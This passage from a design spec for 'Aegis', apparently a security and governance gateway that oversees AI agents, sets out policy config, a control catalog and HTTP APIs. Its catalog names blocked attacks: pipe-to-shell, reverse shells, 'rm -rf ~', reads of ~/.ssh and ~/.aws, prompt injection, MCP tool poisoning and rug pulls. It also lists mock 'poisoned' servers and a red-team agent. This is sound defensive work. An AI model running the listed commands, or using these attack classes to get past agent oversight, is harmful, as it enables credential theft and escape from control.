    - {scope: "agent:claude-code@platform",    window: day,     usd: 30}
    - {scope: "agent:trading-copilot@trading", window: day,     usd: 20}
    - {scope: "agent:research-agent@research", window: day,     compute_s: 5400}
    - {scope: "agent:chaos-agent@platform",    window: day,     usd: 0.50, tokens: 100000, on_hard: require_approval}
    - {scope: "session:*",                     window: session, usd: 5.0, tokens: 3000000}
  loops: {repeat: 3, window: 20, cycle_k: 3, error_streak: 5, ladder: [tool_error, block, kill]}
  rate: {requests_per_min: 120, tool_calls_per_min: 60}
  kill_switch: {global: false, teams: [], members: [], agents: [], sessions: []}

actions:                                # shared classification table (aegis.actions.classify); MCP tools are <server>.<tool>
  - id: spend.subscription
    category: spend
    tools: ["marketpulse.purchase_subscription"]
    amount_arg: amount_usd
    resource_arg: vendor
    resource_prefix: "vendor:"
    title: "{agent} wants to spend ${amount} on {args.vendor} {args.plan}"
  - id: spend.charge
    category: spend
    tools: ["payments.create_charge"]
    amount_arg: amount_usd
    resource_arg: vendor
    resource_prefix: "vendor:"
  - id: db.read
    category: data_read
    tools: ["acme-db.query"]
    args_match: {sql: "(?i)^\\s*(select|with)\\b"}
    resource_arg: sql
    resource_regex: "(?i)\\bfrom\\s+([a-z_][a-z0-9_\\.]*)"
    resource_prefix: "db:"
  - id: db.write
    category: data_write
    tools: ["acme-db.query"]
    args_match: {sql: "(?i)^\\s*(insert|update|delete|drop|alter|truncate)\\b"}
    resource_arg: sql
    resource_regex: "(?i)\\b(?:into|update|from|table)\\s+([a-z_][a-z0-9_\\.]*)"
    resource_prefix: "db:"
  - id: email.external
    category: external_send
    tools: ["mailer.send_email"]
    args_match: {to: "@"}
    args_not_match: {to: "(?i)@acme-capital\\.example$"}   # RE2 has no look-arounds: use args_not_match
  - id: code.deploy
    category: code_exec
    tools: ["Bash"]
    args_match: {command: "(?i)\\b(kubectl\\s+apply|terraform\\s+apply|helm\\s+upgrade|git\\s+push\\b.*\\b(main|prod))"}

approvals:
  defaults: {ttl_s: 900, max_pending: 50, default_approver: admin, default_config_approver: owner,
             hold_s: {hook: 60, mcp: 30, egress: 15, guard: 0, proxy: 0, playground: 0, dashboard: 0}}
  rules:                                # agent actions + budget overrides + MCP re-pins; first match wins
    - {id: spend-self,      when: {action: ["spend.*"], amount_usd_lte: 20},  approver: self}
    - {id: spend-admin,     when: {action: ["spend.*"], amount_usd_lte: 200}, approver: admin}
    - {id: spend-owner-2p,  when: {action: ["spend.*"], amount_usd_gt: 1000}, approver: owner, two_person: true}
    - {id: spend-owner,     when: {action: ["spend.*"]},                      approver: owner}
    - {id: db-restricted,   when: {action: ["db.read"], labels: {sensitivity: RESTRICTED}},   approver: deny}
    - {id: db-pii-read,     when: {action: ["db.read"], labels: {sensitivity: CONFIDENTIAL}}, approver: admin}
    - {id: db-read,         when: {action: ["db.read"]},                      approver: auto}
    - {id: db-prod-write,   when: {action: ["db.write"], labels: {env: prod}}, approver: owner}
    - {id: db-write,        when: {action: ["db.write"]},                     approver: admin}
    - {id: external-send,   when: {action: ["email.external", "egress.post"]}, approver: self}
    - {id: deploy,          when: {action: ["code.deploy"]},                  approver: admin}
    - {id: budget-override, when: {kind: [budget_raise]},                     approver: admin}
    - {id: mcp-repin,       when: {kind: [mcp_pin]},                          approver: admin}
  config_rules:                         # policy / config changes (GOV-05); first match wins; multi-change = max level
    - {id: tighten,          when: {action: ["budget.lower", "control.enable", "control.*.tighten", "killswitch.on", "model.disallow"]}, approver: admin}
    - {id: raise-small,      when: {action: ["budget.raise"], scope_type: [member, agent, session], increase_pct_lte: 100}, approver: admin}
    - {id: raise-team-small, when: {action: ["budget.raise"], scope_type: [team], increase_pct_lte: 50}, approver: admin}
    - {id: raise-large,      when: {action: ["budget.raise"]}, approver: owner}
    - {id: loosen-threshold, when: {action: ["control.threshold.loosen", "model.allow", "killswitch.off"]}, approver: admin}
    - {id: disable-control,  when: {action: ["control.disable", "control.remove", "control.mode", "control.action.loosen"]}, approver: owner}
    - {id: approval-rules,   when: {action: ["approval.rule"]}, approver: owner}

mcp:
  servers:                              # all served by mocks/mock_mcp on :8792 in the demo
    acme-db:     {transport: http, url: "http://127.0.0.1:8792/mcp/acme-db",     destination: local}
    acme-crm:    {transport: http, url: "http://127.0.0.1:8792/mcp/acme-crm",    destination: local}
    marketpulse: {transport: http, url: "http://127.0.0.1:8792/mcp/marketpulse", destination: third_party}
    payments:    {transport: http, url: "http://127.0.0.1:8792/mcp/payments",    destination: third_party}
    mailer:      {transport: http, url: "http://127.0.0.1:8792/mcp/mailer",      destination: third_party}
    web:         {transport: http, url: "http://127.0.0.1:8792/mcp/web",         destination: third_party}
    weather:     {transport: http, url: "http://127.0.0.1:8792/mcp/weather",     destination: third_party}
    poisoned:    {transport: http, url: "http://127.0.0.1:8792/mcp/poisoned",    destination: third_party}
    rugpull:     {transport: http, url: "http://127.0.0.1:8792/mcp/rugpull",     destination: third_party}
  unknown_server_action: block
  on_tool_change: block

feeds:
  sources: [{id: aegis-threat-intel, url: "http://127.0.0.1:8790", pubkey_file: config/feeds/feed_pubkey.b64, poll_s: 10, sse: true}]
  overrides:
    AEGIS-TI-013: {action: redact, justification: "Strip invisible Unicode instead of blocking (copy-paste from PDFs)"}

controls:
  - id: DLP-01
    name: Egress PII & payment-card tokenization (destination-aware)
    action: redact
    severity: high
    params: {redaction_ratio_block: 0.6, mask_style: placeholder}
    owasp: [LLM02:2026, ASI03, MCP10:2025]
    tests:
      - {name: pesel-to-remote, text: "Klient Jan, PESEL 44051401359", destination: remote, expect: redact, control: DLP-01}
      - {name: invalid-pesel,   text: "Zamowienie 44051401358 wyslane", destination: remote, expect: allow}
  - id: ACT-01
    name: Spend guard (purchases, subscriptions, top-ups)
    action: require_approval
    params: {auto_allow_max_usd: 0, hard_block_above_usd: 5000, fx_to_usd: {USD: 1.0, PLN: 0.25, EUR: 1.08}}
    tests:
      - {name: saas-50-admin, kind: mcp, surface: mcp.call, destination: third_party, tool_name: marketpulse.purchase_subscription,
         tool_args: {vendor: marketpulse, plan: mp-pro-monthly, amount_usd: 50}, agent: trading-copilot@trading, expect: require_approval, control: ACT-01}
  - id: INJ-02
    action: block
    threshold: 0.90
    fail_mode: deterministic_only
    timeout_ms: 400
  # … one entry per control in §4.4

tests:
  - {name: aws-key-blocked, text: "key AKIA0123456789ABCDEF", expect: block, control: DLP-02}
```

### 4.4 Control catalog (IDs, owners and defaults are binding)

`Kind`: D deterministic, S semantic, H hybrid, St stateful. "Surfaces" = `applies_to.surfaces`. Defaults = what policy-engine writes into `policy.yaml`; owners document further `params` in their snippet. **MVP** = must work live; **stretch** = may be monitor-only/simplified.

| ID | Name | Owner | Kind | Surfaces | Default action · key params | Prio |
|---|---|---|---|---|---|---|
| GOV-01 | Caller identity & attribution | org-rbac | D | all | `log` (unauthenticated) · `require_auth` from `defaults`; inactive/unknown agent → block when required | MVP |
| GOV-02 | Model allowlist & destination tiering | org-rbac | D | model.request, model.admin | `block` · `models.allowed/denied` ∩ `agent.allowed_models`; `params.reroute_on_class: {RESTRICTED: local}` (route mutation) | MVP |
| GOV-03 | Tool authorization (RBAC + arg constraints) | action-guards | D | tool.input, mcp.call | `block` · `agent.allowed_tools`; `params.deny_tools`, `params.arg_rules: {<tool glob>: {<arg>: <deny regex>}}` | MVP |
| GOV-04 | Human approval gate for other high-impact tools | action-guards | D | tool.input, mcp.call, egress.request | `require_approval` · `params.approve_tools: [<tool globs>]` for side-effecting tools not covered by ACT-*, `max_pending_per_agent: 3`; approvals bound to exact params (fingerprint) | MVP |
| ACT-01 | Spend guard (purchases, subscriptions, top-ups) | action-guards | D | tool.input, mcp.call, egress.request | `require_approval` · `auto_allow_max_usd: 0`, `hard_block_above_usd: 5000` (block, not approvable), `fx_to_usd`, `missing_amount: route_as_max`; budget dimension `spend_usd` | MVP |
| ACT-02 | Data access guard (tables by sensitivity & environment) | action-guards | D | tool.input, mcp.call | `require_approval` · labels `sensitivity`/`env` from `rt.org.resources()`; standing grants in `Agent.meta["data_grants"]` pass; RESTRICTED tables → block | MVP |
| ACT-03 | External send guard (email, webhooks, uploads) | action-guards | D | tool.input, mcp.call, egress.request | `require_approval` · recipients/hosts outside `destinations.internal_domains` | MVP |
| ACT-04 | Code execution & deploy guard | action-guards | D | tool.input, mcp.call | `require_approval` · `code.deploy` patterns (kubectl/terraform apply, helm upgrade, push to main/prod) | MVP |
| GOV-05 | Config-change governance (who may change what) | approvals-engine | D | config.change | `require_approval` · `approvals.config_rules`; allow when proposer already satisfies the level | MVP |
| DLP-01 | PII/PCI/Polish-ID tokenization (destination matrix) | redaction-engine | D | prompt.user, model.request, tool.input, mcp.call, egress.request | `redact` · `destinations.matrix`; `entities`, `redaction_ratio_block: 0.6`, `mask_style: placeholder|pci`, `allowlist_values` | MVP |
| DLP-02 | Secrets & credentials | redaction-engine | D | all `out` except config.change; + tool.output, mcp.result | `block` · `entropy_min: 4.0`, `min_len: 20`, `allow_doc_examples: true` (AWS docs key = log) | MVP |
| DLP-03 | Metadata stripping & generalization | metadata-egress | D | model.request, mcp.call, egress.request | `redact` (mutations + spans) · `strip_headers`, `strip_body_fields: [metadata.user_id, user]`, `generalize: {paths, hostnames, ips, usernames, git_emails}` | MVP |
| DLP-04 | Tool-arg / egress exfiltration scan | metadata-egress | H | tool.input, mcp.call, egress.request | `block` · `max_encoded_len: 64`, `decode_depth: 2`, `query_max_len: 256`, `dns_label_max: 40` | MVP |
| DLP-05 | Output & tool-result leak detection (+ canary) | redaction-engine | D | model.response, tool.output, mcp.result, egress.response | `redact` · `canaries: ["AEGIS-CANARY-7f3a91"]` → block on canary | MVP |
| DLP-06 | Exfil-channel neutralization (md images/links, ANSI) | metadata-egress | D | model.response, tool.output, mcp.result | `redact` · `strip_images: external`, `strip_ansi: true`, `destinations.allowed_link_domains` | MVP |
| DLP-07 | Multilingual NER sensitive data (incl. Polish) | redaction-engine | S | prompt.user, model.request, tool.output, mcp.result | `redact`, threshold 0.6, `fail_mode: open` · ONNX `models/eu-pii-ner` (bardsai eu-pii-anonimization-multilang, INT8) via onnxruntime; Presidio + `en_core_web_sm` optional; **no Polish spaCy (GPL-3.0)**; `entities: [PERSON, ADDRESS, HEALTH, DOB]` | MVP |
| DLP-08 | Vault & controlled re-identification | redaction-engine | D | model.response, tool.input | `allow` + `meta.rehydrate=true` for local destinations (handlers then call `rt.redactor.rehydrate`); never for `third_party` · `rehydrate_to: [local_user, local_tools]`, `vault_ttl_s: 3600`. Raw values never appear in findings | MVP |
| INJ-01 | Normalization + deterministic injection signatures | injection-defense | D | prompt.user, model.request (untrusted segments), tool.output, mcp.result, mcp.list, egress.response | `block` (user) / `redact` quarantine (untrusted) · `decode_depth: 2`, `fuzzy: true`, `extra_signatures: []` | MVP |
| INJ-02 | Semantic injection / jailbreak classifier | injection-defense | S | same as INJ-01 | `block`, threshold 0.90, `fail_mode: deterministic_only` · `untrusted_action: redact` | MVP |
| INJ-03 | Content safety + topic adherence % | semantic-models | S | prompt.user, model.request, model.response | `block` unsafe / `log` off-topic, threshold 0.8, `adherence_pct: 50` · `purpose`, `categories` | MVP (heuristic ok) |
| INJ-04 | Hidden-context exposure (extraction + canary + overlap) | injection-defense | H | prompt.user, model.request, model.response | `block` · `canary: AEGIS-CANARY-7f3a91`, `overlap_threshold: 0.4` | MVP |
| INJ-05 | Goal-drift / grounding check | injection-defense | H | tool.input, mcp.call | `require_approval`, mode `monitor` | stretch |
| EXE-01 | Dangerous command guard | action-guards | D | tool.input, mcp.call, mcp.init | `block` · `deny_patterns`, `approve_patterns`, `allow_patterns` (pipe-to-shell, reverse shell, `rm -rf ~`, `--dangerously-skip-permissions`, `pickle.loads`, `DROP TABLE`) | MVP |
| EXE-02 | Filesystem & network scope (SSRF) | action-guards | D | tool.input, mcp.call, egress.request | `block` · `fs_deny: ["~/.ssh/**","~/.aws/**","**/.env","**/*.pem","~/.claude/**"]`, `block_private_ranges: true`, `allow_hosts: ["127.0.0.1:8791-8799"]` | MVP |
| EXE-03 | Taint-flow breaker (lethal trifecta) | action-guards | St | tool.input, mcp.call, egress.request (+ on_complete of results) | `require_approval` · `private_sources`, `untrusted_sources`, `exfil_tools` | MVP |
| EXE-04 | Loop / rate / circuit breaker / kill switch | budgets-ledger | St | all `out` except config.change | `block` (429 rate, 403 killed) · `budgets.loops/rate/kill_switch`; priority 10 | MVP |
| MCP-01 | Server registry & launch check | mcp-proxy | D | mcp.init, mcp.call | `block` · `mcp.servers`, `mcp.unknown_server_action` | MVP |
| MCP-02 | Tool-definition poisoning scan | mcp-proxy | H | mcp.list | `redact` (drop tool via mutation) · `max_description_len`, uses `aegis.injection.normalize` + `rt.semantic.injection_score` | MVP |
| MCP-03 | Tool pinning (rug pull) & shadowing | mcp-proxy | St | mcp.list, mcp.call | `block` · `mcp.on_tool_change`; changed tool → `ApprovalDraft(kind="mcp_pin")`; `collision_distance: 2` | MVP |
| MCP-04 | Token & auth hygiene | mcp-proxy | D | mcp.init, mcp.call, mcp.result | `block` · `forbidden_scopes`, OAuth URL rules | stretch |
| BUD-01 | Token & cost budgets (remote + local, spend) | budgets-ledger | D | model.request, tool.input, mcp.call, egress.request | `block` (402) · `budgets.*`; clamp `max_tokens`; downgrade at soft | MVP |
| BUD-02 | Local compute & concurrency | budgets-ledger | D | model.request, model.admin (local) | `block` · `max_concurrency: 1`, `max_model_gb: 3` | MVP |
| SIG-01 | External exploit-signature engine | threat-feed | D | all | per signature · `feeds.*`, `feeds.overrides` | MVP |
| SIG-02 | Model-artifact gate (pickle / GGUF) | threat-feed | D | model.admin, artifact.file | `block` · `allowed_formats`, `pickle_global_allow`, malformed = block | MVP |
| SIG-03 | Package-install / slopsquatting guard | threat-feed | D | tool.input, mcp.init | `block` known-bad, `require_approval` unknown · feed `lists` | MVP |
| CUS-01 | Customer-defined rules (e.g. "deal code names must not leave the firm") | semantic-models | H | prompt.user, model.request, tool.input, mcp.call | `block` · `rules: [{id, text, keywords, action}]`; keyword leg deterministic (MVP), natural-language leg via `rt.semantic.judge` on `aegis-judge` (threshold 0.7, `timeout_ms: 2500`, `fail_mode: deterministic_only`; stretch) | MVP |

A2A-01 / A2A-02 (peer identity, inter-agent smuggling) are **reserved**: policy-engine may list them with `enabled: false`; no implementation owner yet.

**Semantic controls without models.** `rt.semantic` always answers: when `AEGIS_SEMANTIC=off`, Ollama/ONNX are missing, or a model times out, semantic-models falls back to a deterministic heuristic scorer (signature/keyword/obfuscation features → score in [0, 1]) and sets `ScoreResult.degraded=True`. Threshold edits therefore still flip verdicts in tests and on stage, and the dashboard shows a `degraded` badge instead of silently passing traffic.

### 4.5 Org seed and demo cast (org-rbac owns `config/org.seed.yaml`; these ids are binding for every workstream)

The seed file is `staging/seed/org.seed.yaml` copied to `config/org.seed.yaml` (org-rbac may fix it, keeping these ids). Loader mapping into the frozen models: member `teams[0]` → `team_id` (all teams in `meta["teams"]`), `title` → `title`; agent `sponsor` → `owner_member_id`, `display_name` → `name`, `kind` (`coding_agent` → `claude-code`, `local_agent` → `scripted`, `remote_agent` → `sdk`, else `other`), `models.allowed` → `allowed_models` (provider prefixes stripped), `tools.allow`/`deny` → `allowed_tools`/`denied_tools`, `max_destination_tier` T0/T1/T2 → `max_destination` local/remote/third_party, `profile_override` → `profile`, `data_grants`/`action_types` → `meta`; `api_keys[]` → stored as `hmac_hex(key, purpose="apikey")`, revoked/expired keys rejected (GOV-01); `resources` → `rt.org.resources()`; `budgets` → ported into policy (§4.3); `control_plane.admin_token` → ignored unless `AEGIS_ADMIN_TOKEN` is unset and `AEGIS_DEMO_MODE=0`.

| Id | Kind | Role / team | Demo purpose |
|---|---|---|---|
| org `acme-capital` | org | "Acme Capital" | the tenant |
| teams `trading`, `research`, `platform` | team | — | budget scopes, dashboard grouping |
| `u_katarzyna` | member | **owner** (all teams) | default viewer; approves owner-level spend, prod writes, control disables, large budget raises |
| `u_marek` | member | **admin**, platform | approves admin-level items; policy maintainer |
| `u_emily` | member | **admin**, trading (+ research) | team lead approver for trading/research |
| `u_piotr` | member | member, trading | sponsor of `trading-copilot@trading`; proposes budget raises he cannot approve |
| `u_olivia`, `u_james` | member | member, trading / research | extra members for the org page |
| `u_agnieszka` | member | member, research | sponsor of `research-agent@research`; self-approves ≤ $20 |
| `u_tomasz` | member | member, platform | sponsor of `claude-code@platform` and `chaos-agent@platform` |
| `claude-code@platform` | agent | platform, remote models | Claude Code via `ANTHROPIC_BASE_URL` + hooks + MCP proxy |
| `research-agent@research` | agent | research, local only (Ollama) | local-first agent; PII may stay local |
| `trading-copilot@trading` | agent | trading, remote (OpenAI wire) | spends on MarketPulse ($50 subscription), reads customers, emails clients |
| `chaos-agent@platform` | agent | platform, tiny budgets | red-team / runaway-loop agent |

Agent keys (fake, safe to commit): `aegis_demo_cc_platform_0000000000000001_NOT_A_SECRET`, `aegis_demo_research_agent_0000000000000002_NOT_A_SECRET`, `aegis_demo_trading_copilot_0000000000000003_NOT_A_SECRET`, `aegis_demo_chaos_agent_0000000000000004_NOT_A_SECRET` (revoked example: `aegis_demo_revoked_key_0000000000000099_NOT_A_SECRET`).

### 4.6 `config/pricing.yaml` (budgets-ledger owns)

```yaml
version: "2026-10-03.1"
currency: USD
unit: per_1m_tokens                      # in/out/cache_* per 1M tokens; compute_s per second (local shadow price)
models:                                  # glob -> price; first match wins
  "claude-opus-*":   {in: 15.0, out: 75.0, cache_read: 1.5, cache_write: 18.75}
  "claude-sonnet-*": {in: 3.0,  out: 15.0, cache_read: 0.3, cache_write: 3.75}
  "claude-haiku-*":  {in: 1.0,  out: 5.0,  cache_read: 0.1, cache_write: 1.25}
  "gpt-4.1-mini":    {in: 0.40, out: 1.60}
  "meta-llama/*":    {in: 0.15, out: 0.40}
  "mock-*":          {in: 3.0,  out: 15.0}          # priced like Sonnet so demo budgets move
  "aegis-*":         {compute_s: 0.0002}            # local shadow price (~USD 0.72 per GPU-hour)
  "qwen*":           {compute_s: 0.0002}
  "hf.co/*":         {compute_s: 0.0002}
  "*":               {in: 5.0,  out: 15.0}          # pessimistic default
tools: {"web.fetch": 0.002}              # optional per-call USD
```

### 4.7 Threat feed formats (threat-feed owns the details in `src/aegis/feed/schema.py`)

- Feed service publishes `GET /feed/latest.json` + `latest.json.sig` and `GET /feed/bundle/{serial}.json` + `.sig`. Signatures: **ed25519 (PyNaCl) detached, base64**, over the exact file bytes. Gateway trusts only `config/feeds/feed_pubkey.b64`.
- `latest.json`: `{"feed": "aegis-threat-intel", "serial": 42, "version": "2026.10.03-4", "bundle": "bundle-000042.json", "sha256": "<hex of bundle bytes>", "published": ISO, "expires": ISO, "key_id": "<hex8>"}`.
- Bundle: `{"feed": {name, schema_version: 1, serial, version, published, expires}, "lists": {<name>: [...]}, "signatures": [Signature…]}`.
- Signature: `id` (`AEGIS-TI-001`…), `title`, `status` (`experimental` = monitor | `stable` | `deprecated` | `withdrawn`), `severity`, `aliases` (CVE ids), `tags` (OWASP/ATLAS), `references`, `applies_to: {surfaces: [Surface…], fields?: [jsonpath…]}`, `match` (closed matcher set: `literal_set`, `regex` (RE2), `url`, `package`, `hash`, `bytes`, `pickle_globals`, `json_path`, `semantic`, composites `any_of`/`all_of`/`not`), `action`, `message`, `tests: {positive: [...], negative: [...]}`.
- Gateway rules: reject bad signature, sha mismatch, `serial <= current` (anti-rollback), schema errors, RE2-uncompilable regex; quarantine signatures whose inline tests fail; keep last-good; stamp `feed_serial` on every decision; SSE `feed.updated` / `feed.rejected`. Activation target < 2 s via feed SSE `GET /feed/events` (event `published`), 10 s poll fallback.

---

## 5. HTTP API

All endpoints are on the gateway `127.0.0.1:8787` unless noted. JSON is snake_case, datetimes ISO-8601 UTC. Pydantic models are dumped with `model_dump(mode="json", by_alias=True)`.

### 5.1 Data plane (agents, apps, Claude Code)

| Method & path | Owner | Semantics |
|---|---|---|
| `POST /v1/messages` (`?beta=true` ok) | core-gateway | Anthropic Messages proxy (JSON + SSE). Forward `anthropic-*` headers and unknown body fields verbatim; passthrough `Authorization`/`x-api-key` when `providers.anthropic.passthrough_auth`. Pipeline `model.request` → upstream → `model.response`. Blocked → synthetic assistant message (or wire error, `defaults.block_response`). |
| `POST /v1/messages/count_tokens` | core-gateway | forwarded upstream (or local estimate for local/mock routes) |
| `POST /v1/chat/completions`, `POST /openai/v1/chat/completions` | core-gateway | OpenAI-compatible proxy (JSON + SSE; injects `stream_options.include_usage`) |
| `GET /v1/models` | core-gateway | merged list of allowed models from `models.allowed` + routable providers |
| `ANY /ollama/{path}` | core-gateway | Ollama native proxy (`OLLAMA_HOST=http://127.0.0.1:8787/ollama`); `/api/chat|generate` → model.request; `/api/pull|create|push|delete|copy` → model.admin; `/api/tags|show|version` pass through |
| `POST|GET|DELETE /mcp/{server}` | mcp-proxy | MCP Streamable HTTP proxy to `mcp.servers[server].url` (both protocol eras). Blocked `tools/call` → JSON-RPC **result** `{isError: true, content: [{type: text, text: "[Aegis] Blocked by <ID>: <reason>"}]}`; unknown server → JSON-RPC error `-32001`. |
| `POST /mcp/{server}/_stdio` | mcp-proxy | inspection endpoint for the stdio wrapper (`python -m aegis.mcp.stdio --server <name> -- <cmd…>`): body `{direction: "out"|"in", message: <jsonrpc>, session_id}` → `{action, message, decision_id}` (stretch) |
| `POST /egress` | metadata-egress | generic third-party HTTP egress: body `{method, url, headers?, json?, body?, tool_name?, wait_s?}` → allowed `200 {status, headers, body, decision_id, redactions}`; blocked/pending → 403 envelope. Logical hosts resolved via `AEGIS_HOST_MAP` **after** policy evaluation. |
| `POST /v1/guard` | core-gateway | generic check for SDKs/tests: body `{interaction: {kind, surface, direction?, destination?, model?, tool_name?, tool_args?, mcp_server?, url?, http_method?, text?, segments?, amount_usd?, resource?, action_type?, labels?, meta?}, identity?: {agent_id?, member_id?, team_id?} (demo mode only), session_id?, wait_s?, approval_id?, dry_run?}` → always `200 {verdict: Verdict, decision_id, segments, text?: <redacted joined text>, approval?: ApprovalRequest}` |
| `POST /v1/guard/complete` | core-gateway | `{decision_id, status_code, usage: Usage}` → settles budgets for externally executed calls → `{ok: true}` |
| `POST /v1/hooks/claude-code` | claude-code-integration | body = raw Claude Code hook JSON; response = Claude Code hook output JSON (always 200; `{}` = no opinion). Mapping: block → `permissionDecision: "deny"` (reason shown to Claude); require_approval → hold `hold_s.hook`, then allow, else deny with "Approval apr_… pending — approve at http://127.0.0.1:8787/ui/governance/approvals?id=apr_…"; redact/rehydrate → `allow` + `updatedInput`; PostToolUse redact → `updatedToolOutput`; UserPromptSubmit block → `decision: "block"`; ConfigChange touching hooks/ANTHROPIC_BASE_URL → block. |
| `GET /healthz` | core-gateway | `HealthResponse` (§5.5); 200 even when degraded |
| `GET /metrics` | audit-metrics | Prometheus exposition (§6.4) |

`scripts/aegis-hook` (bash): reads stdin (≤ 2 MB), `curl -sS --max-time ${AEGIS_HOOK_TIMEOUT:-110}` POST to `$AEGIS_URL/v1/hooks/claude-code` with `X-Aegis-Agent: ${AEGIS_AGENT:-claude-code@platform}` and `Authorization: Bearer $AEGIS_AGENT_KEY`, prints the body, exits 0 (its own curl timeout must stay **below** the settings `timeout`, otherwise Claude Code fails open — see `staging/spikes/claude-code/FINDINGS.md`). On transport failure: for `PreToolUse`/`UserPromptSubmit`/`PermissionRequest`/`ConfigChange` print "Aegis gateway unreachable (fail-closed)" to stderr and **exit 2**; other events exit 0. Demo settings set hook `timeout` ≥ 120 s. Never install machine-wide managed settings; use `claude --settings demo/claude/settings.json`.

### 5.2 Headers

Inbound (consumed, then **stripped** before any upstream):

| Header | Meaning |
|---|---|
| `Authorization: Bearer aegis_…` / `x-api-key: aegis_…` | agent key (only values starting with `aegis_` are consumed; others, e.g. Claude Code's OAuth token, pass through verbatim) |
| `X-Aegis-Agent`, `X-Aegis-Member`, `X-Aegis-Team` | demo identity (accepted when `defaults.require_auth: false`) |
| `X-Aegis-Session` | session id (else `x-claude-code-session-id`, `Mcp-Session-Id`, hook `session_id`, body `session_id`, else generated `ses_…` per agent+hour) |
| `X-Aegis-Approval` | approval id to redeem |
| `X-Aegis-Wait` | seconds to hold for an approval |
| `X-Aegis-View-As` (or `?view_as=`) | dashboard viewer member id (`/api/*` only) |

Outbound on every data-plane response: `X-Aegis-Request-Id`, `X-Aegis-Decision-Id`, `X-Aegis-Decision` (final action), `X-Aegis-Policy-Version`, `X-Aegis-Feed-Serial`, `X-Aegis-Redactions` (count), `Server-Timing` (`aegis;dur=…, ctl;dur=…, upstream;dur=…`), and when applicable `X-Aegis-Downgraded-From`, `X-Aegis-Budget-Remaining` (`usd=0.42;scope=team:research`), `X-Aegis-Approval-Id`.

### 5.3 Status codes and the error envelope

| Situation | Model proxies (`/v1/messages`, `/v1/chat/completions`, `/ollama`) | `/egress`, `/api/*` (note: `/v1/guard` and `/v1/hooks/claude-code` always answer 200 with the verdict) |
|---|---|---|
| policy block | `defaults.block_response: message` → **200** synthetic assistant reply `"[Aegis] Blocked by DLP-02: AWS access key detected. …"` (stream or JSON); `error` → 403 in wire format | **403** `policy_blocked` |
| approval pending | 200 synthetic reply with approval id + link (or 403 `approval_required`) | **403** `approval_required` (+`approval_id`, `required_role`, `expires_at`) |
| budget exhausted | **402** `budget_exceeded` (non-retryable; wire-format error body) | **402** `budget_exceeded` |
| rate limit / loop throttle | **429** `rate_limited` + `Retry-After` | **429** `rate_limited` |
| kill switch | **403** `killed` | **403** `killed` |
| not allowed to do this (dashboard RBAC) | — | **403** `forbidden` |
| invalid input | 400 `invalid_request` | 400 `invalid_request` / 422 |
| optimistic-lock conflict (policy `base_version`) | — | **409** `conflict` |
| upstream failure | 502 `upstream_error` | 502 `upstream_error` |

Envelope (all non-model endpoints, and `/v1/*` errors in OpenAI format use the same inner object):
```json
{"error": {"type": "approval_required", "message": "Spending $50.00 on Notion Plus needs admin approval",
           "control_id": "GOV-04", "decision_id": "dec_…", "approval_id": "apr_…",
           "required_role": "admin", "expires_at": "2026-10-03T21:00:00Z", "scope": null, "retry_after_s": null}}
```
Anthropic-wire errors: `{"type": "error", "error": {"type": "<same type>", "message": "…"}, "aegis": {<same inner object>}}`.

### 5.4 Dashboard API (`/api/*`)

Viewer identity: `X-Aegis-View-As: <member_id>` (EventSource: `?view_as=`). Read endpoints need `member`+; mutations state their minimum. Response types are the TypeScript interfaces in §5.5 (backend returns exactly these shapes). Lists support `?limit=` (default 100, max 1000) and `?cursor=` (opaque) and return `Page<T>` unless noted.

| Method & path | Owner | Request → Response | Notes |
|---|---|---|---|
| `GET /api/events` | core-gateway | query `view_as`, `events=decision,approval.created,…` (optional filter), `replay=<n>` → SSE stream (§6.3) | heartbeat every 15 s; supports `Last-Event-ID` from ring buffer (1000 msgs) |
| `GET /api/decisions` | audit-metrics | `?action=&control_id=&kind=&surface=&agent_id=&team_id=&member_id=&since=&q=` → `Page<DecisionSummary>` (newest first) | from SQLite `decisions` |
| `GET /api/decisions/{id}` | audit-metrics | → `DecisionDetail` | `wire` from `rt.pipeline.wire(id)` (null after eviction) |
| `GET /api/stats` | audit-metrics | `?window=1h|24h|7d` → `StatsResponse` | buckets: 1 min (1h), 15 min (24h), 3 h (7d) |
| `GET /api/perf` | audit-metrics | → `PerfResponse` | includes `reports/bench.json` if present |
| `GET /api/audit` | audit-metrics | `?event_type=&since=` → `Page<AuditEvent>` | |
| `GET /api/audit/export` | audit-metrics | `?format=jsonl|csv|ocsf&from=&to=&action=&control_id=&agent_id=` → file download (`Content-Disposition`) | **admin** |
| `GET /api/audit/verify` | audit-metrics | → `AuditVerifyResult` | |
| `GET /api/budgets` | budgets-ledger | → `BudgetsResponse` | scope tree org → team → member → agent |
| `GET /api/budgets/history` | budgets-ledger | `?scope=&dimension=usd&window=24h` → `BudgetHistoryResponse` | |
| `POST /api/budgets/raise` | budgets-ledger | `{scope, window, dimension, new_limit, reason}` → `ApplyResult` | builds `PatchOp`s → `rt.policy.propose(viewer, patch=…)`; may be `pending_approval` |
| `POST /api/budgets/reset` | budgets-ledger | `{scope?: string}` → `{ok: true}` | **admin**; demo reset of counters |
| `POST /api/killswitch` | budgets-ledger | `{scope: "global"|"team:x"|"member:x"|"agent:x"|"session:x", active: bool, reason}` → `ApplyResult` | via `propose` (kill on = tighten → admin) |
| `GET /api/org` | org-rbac | → `OrgResponse` | |
| `GET /api/members` | org-rbac | → `{items: Member[]}` | includes `agents` ids |
| `POST /api/members` | org-rbac | `{name, email, role, team_id}` → `Member` | **admin**; creating an owner needs **owner** |
| `PATCH /api/members/{id}` | org-rbac | `{role?, team_id?, active?}` → `Member` | **admin**; role changes to/from owner need **owner**; audit `org.changed` |
| `GET /api/agents` | org-rbac | → `{items: Agent[]}` | with `status`, `spend_today_usd` |
| `PATCH /api/agents/{id}` | org-rbac | `{active?, allowed_models?, allowed_tools?, profile?}` → `Agent` | **admin** |
| `GET /api/whoami` | org-rbac | → `WhoAmI` | used by the role switcher |
| `GET /api/approvals` | approvals-engine | `?status=pending|approved|denied|expired|cancelled|all&kind=&mine=true` → `ApprovalsResponse` | each item has `can_vote`/`why_not` for the viewer |
| `GET /api/approvals/{id}` | approvals-engine | → `ApprovalRequest` | |
| `POST /api/approvals` | approvals-engine | `ApprovalDraft` JSON → `ApprovalRequest` | manual request (e.g. member asks for more budget) |
| `POST /api/approvals/{id}/approve` | approvals-engine | `{comment?}` → `ApprovalRequest` | 403 `forbidden` with reason if viewer not eligible |
| `POST /api/approvals/{id}/deny` | approvals-engine | `{comment?}` → `ApprovalRequest` | |
| `POST /api/approvals/{id}/cancel` | approvals-engine | `{}` → `ApprovalRequest` | requester or admin |
| `GET /api/approvals/rules` | approvals-engine | → `ApprovalRulesResponse` | |
